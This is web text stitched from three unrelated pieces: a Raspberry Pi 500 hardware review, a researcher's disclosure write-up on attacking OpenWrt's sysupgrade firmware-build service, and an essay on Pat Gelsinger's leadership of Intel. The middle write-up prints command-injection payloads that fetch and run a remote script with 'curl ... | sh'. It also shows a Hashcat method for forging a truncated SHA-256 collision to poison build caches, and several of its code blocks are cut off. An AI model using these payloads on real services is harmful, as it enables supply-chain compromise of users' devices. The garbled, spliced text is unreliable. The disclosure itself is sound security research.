As a kid in the 1980s, I had various Commodore machines, so I was well versed in keyboards that were computers. But for the Raspberry Pi 400 this was a bold choice, and it seems that it paid off as Raspberry Pi has now announced the $90 Raspberry Pi 500, based on the current flagship <a data-analytics-id="inline-link" href="https://www.tomshardware.com/reviews/raspberry-pi-5" data-before-rewrite-localise="https://www.tomshardware.com/reviews/raspberry-pi-5"><u>Raspberry Pi 5</u></a>.</p><p>The Raspberry Pi 500 is available on its own for $90, or as part of a $120 Desktop kit. Both come with a 32GB A2 SDR104 compatible micro SD card, but the Desktop kit comes with a 27W USB Type-C power supply, micro HDMI to HDMI cable and the Raspberry Pi Beginner’s Guide.</p><p>Our review unit is essentially the Desktop kit, minus the beginner’s guide. Is the Raspberry Pi 500 the true successor to the Pi 400?

Just take your time, plastic spudgers, and carefully use a little heat from a hairdryer or one of the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/best-picks/best-soldering-irons" data-before-rewrite-localise="https://www.tomshardware.com/best-picks/best-soldering-irons"><u>best soldering stations</u></a>.</p><p>I got in, and was greeted by a huge piece of aluminum covering the entire PCB and cradling the keyboard. This is the same setup as the Pi 400 and it will later explain why the Raspberry Pi 500’s thermal performance was so good. Removing the aluminum was a little tricky. The four screws were easy, but the thermal pad holding the aluminum heatsink to the SoC was stuck solid. A little heat, some plastic pry tools and patience won the battle. When putting it all back together, ensure that the heatsink is touching the thermal pad, otherwise the chip will not be cooled.</p><p>The PCB is very similar to the Pi 400 (a theme that permeates this review) but with the GPIO and USB ports swapped around. Looking around the board, it is hard to miss that there is a large M.2 shaped space. A space that could accommodate up to 2280 sized NVMe SSDs, or even an AI accelerator but there is a catch. There is no connector. I asked Raspberry Pi CTO Gordon Hollingworth about this, and his response was that it was a balance of functionality and performance versus cost / capability trade-off. But Hollingworth says the Raspberry Pi 50 "is a good product which hits the same market as Raspberry Pi 400."<br>Another factor in the omission of using NVMe SSDs, is that it's not exactly easy to open the case. The plastic could be easily broken, leaving you with a cosmetically damaged Raspberry Pi 500.</p><p>I also spotted an RP2-B2 chip next to the keyboard FFC connector. The RP2 is the RP2040, and the B2 stepping is the latest. This is acting as a keyboard controller, given its proximity to the keyboard FFC. Hollingworth's response being "Yes - why use a random bit of hardware when we can use our own!"</p><p>Finally, there is a large section of the PCB which is unpopulated. Not a surface mount component to be seen! I spotted a place for a surface mount capacitor, but other than that, the only clue is PoE (Power over Ethernet). This was another feature which didn't make the cut, for the same reasons as M.2 PCIe support is omitted.</p><p>You will have also noticed that there are no connectors for the official <a data-analytics-id="inline-link" href="https://www.tomshardware.com/raspberry-pi/raspberry-pi-touch-display-2-review-a-touch-of-class" data-before-rewrite-localise="https://www.tomshardware.com/raspberry-pi/raspberry-pi-touch-display-2-review-a-touch-of-class"><u>Touch Display 2</u></a>, or the many Raspberry Pi Cameras. The Pi 400 and 500 are both without these connectors, but we can easily connect a USB camera, and two HDMI displays to the Pi 500, so it isn’t a huge loss.</p><h2 id="raspberry-pi-500-thermal-and-power-performance-3">Raspberry Pi 500 Thermal and Power Performance</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Following in the footsteps of the Pi 400 is no bad thing when we’re talking thermal performance.

But deep down in our heart we really wanted a little something extra under the hood.</p><h2 id="gpio-access-on-the-raspberry-pi-500-3">GPIO access on the Raspberry Pi 500</h2><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-UsUMufRUcy86LXgPtqnAz4-dN5okiacZjk5O5xX79toHq8luQIlIy84"><figure data-bordeaux-image-check="false"><div><picture data-hydrate="true"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Raspberry Pi 500" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div><figcaption><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure></div><p>Just like the Raspberry Pi 400, the Pi 500 needs a breakout board in order to access the GPIO. Luckily, the pinout is the same, so you can reuse an older breakout board. The port comes covered by a rubber stopper,easily removed with some tweezers. Essentially you will have the same GPIO pins as the Raspberry Pi 5, and because of the changes to how Python software is installed (PEP668) and Raspberry Pi’s decision to use the RP1 “Southbridge” for the GPIO, you will have the same experience. All you need to do is use the aforementioned breakout to correctly route the pins for use with a HAT.</p><h2 id="use-cases-for-the-raspberry-pi-500-3">Use Cases for the Raspberry Pi 500</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Just like the Raspberry Pi 400, the Pi 500 is there to be a 21st century equivalent to the home computers of the 1980s.

It's a powerful machine, in a pleasant package. I’m old enough to remember the 1980s home computer craze, and this, just like the Pi 400, reminds me of that time. But now we have much more power. This is a great all-rounder, but like I have been saying throughout this review, it shares many good and bad things with the Pi 400 and the GPIO access and the lack of camera / display ports are the only real negatives. The omission of PCIe based storage is unfortunate, but without an easy access hatch, the plastic would soon break.</p><p>The Raspberry Pi 500 is the kit that you buy as a gift for someone, or as a child’s first computer. I can see this being used in schools and to an extent in offices around the world.</p>

    <h2 id="introduction">Introduction</h2>
<p>Hello, I’m RyotaK (<a href="https://twitter.com/ryotkak" target="_blank" rel="noopener">@ryotkak</a>
), a security engineer at Flatt Security Inc.</p>
<p>A few days ago, I was upgrading my home lab network, and I decided to upgrade the <a href="https://openwrt.org/" target="_blank" rel="noopener">OpenWrt</a>
 on my router.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> After accessing the LuCI, which is the web interface of OpenWrt, I noticed that there is a section called <code>Attended Sysupgrade</code>, so I tried to upgrade the firmware using it.</p>
<p>After reading the description, I found that it states it builds new firmware using an online service.</p>
<center>
&nbsp; &nbsp; <img alt="The attended sysupgrade service allows to easily upgrade vanilla and custom firmware images. This is done by building a new firmware on demand via an online service." src="https://flatt.tech/research/compromising-openwrt-supply-chain-sha256-collision/01.png">
</center>
<p>At this point, I was curious about how it works, so I decided to investigate about it.</p>
<h2 id="sysupgradeopenwrtorg">sysupgrade.openwrt.org</h2>
<p>After some research, I found that the online service mentioned above is hosted at <code>sysupgrade.openwrt.org</code>. This service allows users to build a new firmware image by selecting the target device and the desired packages.<br>
When the user tries to upgrade the firmware, OpenWrt on the user side sends a request to the server with the required information including:</p>
<ul>
<li>Target architecture</li>
<li>Device profile</li>
<li>Selected packages</li>
</ul>
<p>The server then builds the firmware image based on the information and sends it back to the OpenWrt, which then flashes the firmware image to the device.</p>
<p>As you can imagine, building an image with user-provided packages can be dangerous. If the server is building the user-provided source code and is not properly isolated, it can be easily compromised.</p>
<p>So, I started to investigate if there were any security issues in the service.</p>
<h2 id="command-injection">Command injection</h2>
<p>Fortunately, the server hosted at <code>sysupgrade.openwrt.org</code> is an open-source project, and the source code is hosted at <a href="https://github.com/openwrt/asu" target="_blank" rel="noopener">openwrt/asu</a>
.<br>
I’ve set up the local instance of the service to investigate further and test the behavior of the service without impacting the production environment.</p>
<p>After reading it a bit, I found that the server is using the containers to isolate the build environment like the following:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L154-L164" target="_blank" rel="noopener">asu/build.py line 154-164</a>
</p>

</span></span></code></pre></div><p>I immediately noticed that the length of the hash is truncated to 12, out of 64 characters.<br>
12 characters are equivalent to 48 bits, and the key space is <code>2^48 = 281,474,976,710,656</code>, which seems to be too small to avoid collisions.</p>
<p>While this hash isn’t used as the cache key, the outer hash that includes this hash is used. So, by creating a collision of the packages’ hash, we can produce the same cache key even if the packages are different. This allows an attacker to force the server to return the wrong build artifact for requests that have different packages.</p>
<p>As I was unsure if the collision was actually possible, I decided to test it by brute-forcing the SHA-256 to find a 12-character collision.</p>
<h2 id="brute-forcing-the-sha-256">Brute-forcing the SHA-256</h2>
<p>Since I couldn’t find the hash brute-forcing tools with partial match support, I started to implement it by myself.</p>
<p>After some trial and error, I successfully made an OpenCL program to perform the brute-forcing on the GPU. However, upon testing it, the performance was terrible, it takes 10 seconds to calculate 100 million hashes.<br>
This was mostly equivalent to the hash rate of the CPU, and as I had never written an OpenCL program before, I couldn’t optimize it further.</p>
<p>So, I ended up using the known hash brute-forcing tool program called <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a>
.<br>
With the following little hack, I was able to make the Hashcat print the hashes with only 8 characters matched.</p>

<h2 id="combining-both-attacks">Combining both attacks</h2>
<p>To combine both attacks, we need to find a payload that has the 12-character hash collision against the legitimate package list.</p>
<p>I’ve gathered the package list from the <code>firmware-selector.openwrt.org</code>, which is a frontend of the <code>sysupgrade.openwrt.org</code>, and calculated the legitimate hash:</p>

</span></span></code></pre></div><p>The first 12 characters of this hash are <code>8f7018b33d94</code>, so we need to find a command injection payload that has the same prefix for the hash.</p>
<p>To find such a payload, I executed the modified version of the Hashcat on RTX 4090 with the following command:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ ./hashcat -m <span>1400</span> 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb -O -a <span>3</span> -w <span>3</span> <span>'`curl -L tmp.ryotak.net/?l?l?l?l?l?l?l?l?l?l|sh`'</span> --self-test-disable --potfile-disable --keep-guessing
</span></span></code></pre></div><p>After executing the command, Hashcat started to calculate hashes at the speed of around 500 million hashes per second, so I left it running.</p>
<p>When I checked the output after a while, the Hashcat calculated all possible patterns, but it didn’t find 12-character collisions. This was because I calculated the space of <code>?l?l?l?l?l?l?l?l?l?l</code> wrongly.</p>
<p><code>?l</code> is a mask pattern that generates <code>a-z</code>, so the space of <code>?l?l?l?l?l?l?l?l?l?l</code> (10 characters) is <code>26^10 = 141,167,095,653,376</code>, which is about half of <code>2^48 = 281,474,976,710,656</code>.<br>
But, while calculating the space, I incorrectly calculated it as <code>26^11 = 3,670,344,486,987,776</code>, and thought that it should be enough to find the collision.</p>
<p>So, I fixed the mask pattern to <code>?l?l?l?l?l?l?l?l?l?l?l</code> (11 characters) and left it running again. After executing the command, I wondered if I could make the brute-forcing faster, so I started to poke the Hashcat.</p>
<p>Soon, I noticed that the performance drastically increased when I moved the mask pattern to the start of the command like <code>`?l?l?l?l?l?l?l?l?l?l?l `curl -L tmp.ryotak.net/|sh`</code><br>
With a bit of testing, I confirmed that I can increase the speed about 36 times by simply changing the pattern to the following:</p>
<pre tabindex="0"><code>`?l?l?l?l?l?l?l?l?l?l?l||curl -L tmp.ryotak.net/8f7018b33d94|sh`
</code></pre><p>By using this pattern, the Hashcat was able to calculate the hashes at the speed of 18 billion hashes per second. Within an hour, the Hashcat found the 12 characters collision:</p>
<pre tabindex="0"><code>$ printf '`slosuocutre||curl -L tmp.ryotak.net/8f7018b33d94|sh`' | sha256sum

</code></pre><p>Sending this payload as the <code>packages</code> parameter, the command injection is triggered and the script from <code>tmp.ryotak.net</code> is executed.<br>
I placed the following script in <code>tmp.ryotak.net/8f7018b33d94</code>, which overwrites the artifact produced by the imagebuilder.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cat &gt;&gt; /builder/scripts/json_overview_image_info.py <span>&lt;&lt;PY

<p>After confirming the attack, I reported the issue to the OpenWrt team via <a href="https://github.com/openwrt/asu/security/advisories/new" target="_blank" rel="noopener">the private vulnerability reporting on GitHub</a>
.</p>
<p>Soon after acknowledging the issue, they stopped the <code>sysupgrade.openwrt.org</code> service temporarily and investigated the issue. Within 3 hours, they released the fixed version and restarted the service.</p>
<p>While both issues are fixed by the OpenWrt team, it was unknown if this attack was exploited by someone else because this vulnerability existed for a while.<br>
So, they decided to release <a href="http://lists.openwrt.org/pipermail/openwrt-announce/2024-December/000061.html" target="_blank" rel="noopener">an announcement</a>
 to notify the users to ensure no devices are compromised and detect if it was compromised.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this article, I explained how I could compromise the <code>sysupgrade.openwrt.org</code> service by exploiting the command injection and the SHA-256 collision.<br>
As I never found the hash collision attack in a real-world application, I was surprised that I could successfully exploit it by brute-forcing hashes.</p>
<p>I appreciate the effort of the OpenWrt team to fix the issues in an incredibly short time and notify the users promptly.</p>

            <div>
                <p>By all accounts, Pat Gelsinger is affable, technically sharp, hard-working, and decent.
Those who have worked for him praise him as a singularly good manager.
In January 2021, when Gelsinger was abruptly named the CEO of Intel, this is more or less all I knew of him — and I found myself urgently needing to learn much more.</p>
<p>To understand my urgency, it’s worth rewinding the clock back to late 2019 and the earliest
days of
<a href="https://oxide.computer/">Oxide</a>.  We knew what we wanted to build, but we had some big (consequential!)
decisions to make — first among them our choice of host CPU.  Based on
what we had seen in AMD Naples and Rome, we felt that AMD was clearly outpacing Intel,
but this was a big bet and we wanted to be rigorous about it.  Even though
we felt Xeon was unlikely to be our direction, we scheduled a meeting with Intel in Santa Clara
(pre-COVID!) to understand their roadmap.</p>
<p>We wanted to take advantage of the all-day meeting to understand the other components that Intel was making
that might be relevant for us, so we also asked for roadmap briefings on NIC
silicon (Columbiaville) and switching silicon (Tofino).
The host CPU discussion ended up confirming our beliefs
(befitting our
<a href="https://oxide-and-friends.transistor.fm/episodes/rfds-the-backbone-of-oxide">writing-intensive culture at Oxide</a>
we wrote up our findings in
<a href="https://rfd.shared.oxide.computer/rfd/0012">RFD 12 Host CPU Evaluation</a>),
and the NIC discussion similarly was a dead end.  The switching silicon discussion, however,
was interesting:  Tofino was TSMC-fabbed (the only Intel part at the time fabbed outside of Intel)
and we found the programmable nature of it via
<a href="https://p4.org/">P4</a> to be really compelling.  Up until that point,
we had assumed that we would have to use Broadcom, and we weren’t thrilled at the prospects;
the idea of having not just an alternative, but one with such a novel approach was hugely
appealing.  The Tofino team at Intel was enthused by our early interest, proving itself
to be very responsive in the weeks that followed as we continued to explore the
prospects of building around their Tofino 2. The more we learned, the more we liked!</p>
<p>As we got deeper with Tofino, we did, however have a single, substantial reservation: <strong>we didn’t trust Intel to not kill it.</strong>
Intel has a long, long (long!) track record of fostering innovation outside of its mainstay
x86 product — and then killing it.
Making things more complicated, these untimely deaths are not without ambiguity:  the efforts that Intel kills are often
early and interesting — but need patience and more iterations to be able to win a broader
market.  And while the cullings are not always wrong (no amount of patience would have saved
<a href="https://bcantrill.dtrace.org/2008/07/18/revisiting-the-intel-432/">the iAPX 432</a>), the
biggest mistakes in the last two decades at Intel (namely, its failures in
mobile CPUs and discrete GPUs) are a result of discarding a flawed effort entirely rather than
learning from it and iterating.</p>
<p>Still, we loved the idea of P4 and programmable switch silicon, and we really liked the Tofino team at Intel:
we felt our teams had a shared vision for the programmable data center — and they were very accommodating
of our desire to build something very different from a commodity switch.
So despite our trepidations, we stepped over
<a href="https://www.intel.com/content/www/us/en/ark/products/codename/63546/products-formerly-red-rock-canyon.html">the desiccated carcass of Red Rock Canyon</a>, and engaged
on building a switch with Tofino.
And we didn’t (and don’t!) regret it:
it was of course
<a href="https://oxide-and-friends.transistor.fm/episodes/the-sidecar-switch-2021-11-29">brutally hard to build our own switch</a>,
but the dividends of programmability were enormous — and thanks to Tofino and P4,
<a href="https://oxide-and-friends.transistor.fm/episodes/rack-scale-networking">we were able to build some important,
unique functionality</a>.</p>
<p>But by the time Gelsinger became CEO in early 2021, our finished product was still a bit in the future:  we knew what we were
building, but we were in the thick of building it.
It was important for me to understand the incoming CEO, and if possible, to get an audience with Gelsinger to explain what we saw in Tofino (and to understand
what his vision was for programmable networking silicon).
So — and as I relayed in
<a href="https://oxide-and-friends.transistor.fm/episodes/intel-after-gelsinger">our recent podcast episode on Intel after Gelsinger</a> — I tried to learn as much as possible about
the guy in his own words.
This would normally mean binge listening podcasts, talks, interviews, etc. — but in Gelsinger’s case, I hit an early and familiar jackpot:
as part of their superlative series, the
<a href="https://computerhistory.org/">Computer History Museum</a> had a
<a href="https://www.youtube.com/watch?v=JTKkY2kZuEw">four-hour oral history with Pat Gelsinger</a>.</p>
<p>And in listening to Gelsinger, his affability clearly came across, along with his technical acumen and
depth of experience.
But something else came across too:  an indisputable undercurrent of arrogance.
Now, it’s a little hard to be critical, given the context:  the whole point of an oral history after all is for people to speak about themselves.
Still, these oral histories are most interesting when they take the opportunity to expand on failures, and
Gelsinger’s narrative of his time at Intel seemingly just went from strength to strength.  Worse,
in his own story, the bad things at Intel always seemed to happen when he wasn’t in the room or otherwise over his objections — and
the good things always when he was called in to save an effort from failure.  I’m sure this retelling has truth to it,
but I found it surprising that his narrative about AMD Opteron is of Intel conquering AMD with Nahalem under
his leadership — with no mention of Intel’s gross architectural missteps with respect to 64-bit that allowed (and even demanded!) AMD Opteron
in the first place.</p>
<p>But, fine.  Again, it’s an oral history; there’s going to be a
<a href="https://en.wikipedia.org/wiki/Rashomon_effect">Rashomon effect</a>.
And so the guy was confident; so what?
My feeling of his arrogance was still a bit amorphous
when we got to Gelsinger retelling the end of his time at Intel.
I was waiting for this, because I knew that Gelsinger had led the charge on Larrabee — and that
<a href="https://brightsideofnews.com/blog/an-inconvenient-truth-intel-larrabee-story-revealed/">Larrabee was infamously a wreck</a>.
He lamented leaving Intel because he knew that Larrabee would be killed after he departed (which it was),
but I was shocked when he said that had Intel
<a href="https://www.youtube.com/watch?v=MxZe1i8z-8Y&amp;t=1000s">"stayed with it…​ NVIDIA would be a fourth the size they are today."</a>
I was washing the dishes as I was listening to this, and it stopped me in my tracks:  I turned off the faucet, dried my hands, and backed up the recording.
Had I heard correctly?!
If one wanted to make this eyewatering claim, it must be loaded with riders and caveats: it must acknowledge that Larrabee itself
was an unusable disaster; that NVIDIA had an indisputable lead, even in 2009; that for Intel to dominate NVIDIA it would have required conjuring software
expertise and focus with which
Intel has famously struggled; that Intel had no pattern for sustained success out of x86.
On the one hand, there were enough qualifiers from Gelsinger to soften this claim a little (and at least some passing respect for
NVIDIA’s Jenson Huang and Bill Dally), but on the other…​ yes, he actually claimed that NVIDIA had <strong>his departure</strong> from Intel to thank
for (<a href="https://archive.computerhistory.org/resources/access/text/2019/06/102781086-05-01-acc.pdf">checks transcript</a>) <strong>three quarters</strong> of its size.  (Which, even in 2019 when the conversation was recorded, amounted to a whopping ~$75B!)</p>
<p>I think even the interviewers were a little taken aback, and
<a href="https://www.youtube.com/watch?v=MxZe1i8z-8Y&amp;t=1151s">asked the question directly</a>:
"Do you think that it was in part that you weren’t there to drive [Larrabee] forward that they decided to withdraw from that?"
Gelsinger’s response:  "Yeah, I’ll say that very directly."</p>
<p>This was beyond mere confidence, and was looking more like a total disregard for one’s own limitations.
Another feeling was growing inside me:  despite his many positive attributes, Gelsinger was the wrong person for the job.
And to be clear, the job in 2021 was to lead a company in crisis, viz.
the
<a href="https://assets.thirdpointlimited.com/f/166217/x/8a9b8ea40d/third-point-letter-to-intel-december-2020-tpou.pdf">letter from Third Point that precipitated the firing of Bob Swan</a>.
Intel’s strategic mistakes were (in my opinion) symptomatic of <strong>an acute cultural problem</strong>:  the company still carried with it the inherited
arrogance from an earlier age.
A concrete manifestation of the company’s arrogance is that <strong>it didn’t listen</strong>:
it didn’t listen to its own people (and therefore struggled to correct course even when the rank-and-file knew that the trajectory is wrong)
and it didn’t listen to its customers (and therefore built the wrong things for new markets — or missed out on those markets entirely).
Intel needed a leader that could confront this cultural problem directly — who could work to undo an accretion of generations of entitlement — but
if Gelsinger’s narrative for himself was any indicator, it felt like he would instead be feeding the company’s worst impulses about
its own exceptionalism.
As Gelsinger returned, I found no reassurance in the company’s narrative, which felt less like
<a href="https://www.youtube.com/watch?v=ZN12-hJI7ws">the arrival of Winston Wolf</a>,
and more like a cherished prince returning home to live out his destiny.</p>
<p>The concern that Gelsinger would be reliving his past more than navigating Intel’s future wasn’t exactly put to rest when, shortly after his arrival, Intel launched its cringy-as-hell
anti-Apple
<a href="https://www.inc.com/jason-aten/intels-ad-campaign-against-apple-is-perfect-example-of-why-its-getting-beat-so-badly.html">"Go PC" ad campaign</a>.
(It tells you everything you need to know that Intel
<a href="https://www.youtube.com/playlist?list=PLk2sjg_-F-MfQL0aUbKyDX909ZfKCUq1c">deleted the Go PC ads</a>, but then
<a href="https://www.youtube.com/@IntelCanada/search?query=gopc">forgot about Canada</a>.)  Fortunately for future historians of corporate dreck, the cringiest of these ads was
immortalized when
<a href="https://www.youtube.com/watch?v=HbkdpyUlJNs">Marques Brownlee and David Imel absolutely ripped it apart</a>.  "Go PC" was an embodiment of the arrogance
that I feared came from the top; how could <strong>anyone</strong> think that Intel’s biggest problem in 2021 was competing against…​ the Mac?!  They knew that AMD
also made x86 parts, right?!  The whole campaign frankly felt juvenile, as if they were trying to just deride Apple for their decision to
<a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_silicon">build their own silicon</a>.</p>
<p>Much meatier than an ill-advised ad campaign was Gelsinger’s announcement that they would have
<a href="https://www.anandtech.com/show/16823/intel-accelerated-offensive-process-roadmap-updates-to-10nm-7nm-4nm-3nm-20a-18a-packaging-foundry-emib-foveros">5 process nodes in 4 years</a>.
This was — and is — an aggressive bet for a company that had an entire process node (10nm) slip for years and then
quietly fail to yield but a single product
(<a href="https://en.wikipedia.org/wiki/Cannon_Lake_(microprocessor)">Cannon Lake</a>).  From the perspective of an Intel customer, Intel had never come completely clean about
the failing of 10nm (publicly or privately); how could Intel expect outsiders to trust them to learn from their mistakes if it wouldn’t even publicly acknowledge what
those mistakes were?
I don’t think that that bet was <em>necessarily</em> the wrong bet,
but it was indisputably going to be expensive and risky.
And this gets to Gelsinger’s first real, unequivocal mistake:
<strong>he didn’t eliminate Intel’s dividend.</strong>
Eliminating the dividend would have sent an early message to
everyone — shareholders and employees — that the company’s survival was at stake, and it would have helped build the war chest for the battles to come.
While I think his dichotomy is a bit reductive,
<a href="https://hbr.org/2011/04/peacetime-ceos-vs-wartime-ceos">Ben Horowitz’s nomenclature</a> is useful here:  Intel needed a
wartime CEO — but in maintaining a dividend that it couldn’t afford, Gelsinger was committing the ultimate peacetime act.
(I am not alone in this view;
<a href="https://sharptech.fm/member/episode/gelsinger-out-at-intel-20-years-of-structural-challenges-and-strategic-blindspots-the-board-and-whats-next">Ben Thompson of Stratechery
dropped a must-listen episode on Intel</a> in which he
cites the paying out of billions of dollars of dividends over Gelsinger’s tenure as an early and serious blunder.)</p>
<p>Beyond being merely expensive and risky, the newly-christened Intel Foundry Services (IFS) had another, deeper problem:  the culture at Intel
didn’t really seem amenable to the level of customer engagement that foundry customers (rightfully) expect.  And this was compounded by
the trust issue that we at Oxide felt with Intel over Tofino:  why would a customer trust their future to something chancy like IFS?  Absent the
availability of 18A, the only
answer that Intel ever seemed to give on this was to wrap itself in the flag:  that one should choose IFS solely because the fabs are on US soil.  In this regard,
it reminds me (ironically?) of
a long-ago CPU startup, <a href="https://en.wikipedia.org/wiki/Transmeta">Transmeta</a>.  They had interesting technology, but unable to compete with Intel on absolute
performance, they retreated to power efficiency.  Transmeta was implicitly relying on the fact that Intel wouldn’t release a lower power part,
but Intel promptly turned around and introduced the
<a href="https://en.wikipedia.org/wiki/Pentium_M">Pentium-M</a> line — and that was more or less it for Transmeta.  Similarly, is Intel assuming that TSMC is
unable to build fabs in the US or that the US government wouldn’t see such fabs as addressing geopolitical concerns?
If so, it feels like a
<a href="https://www.commerce.gov/news/press-releases/2024/11/biden-harris-administration-announces-chips-incentives-award-tsmc">bad assumption on both fronts</a>.</p>
<p>Skepticism of Gelsinger’s plan for Intel aside,
we at Oxide anxiously watched Tofino.  At Intel,
the team itself believed it was safe under Gelsinger,
and things did indeed seem okay for a while.
Fast-forward two years to 2023, and we got an urgent request for a call from the executive leading the Tofino effort.  Fearing the worst, we were honestly
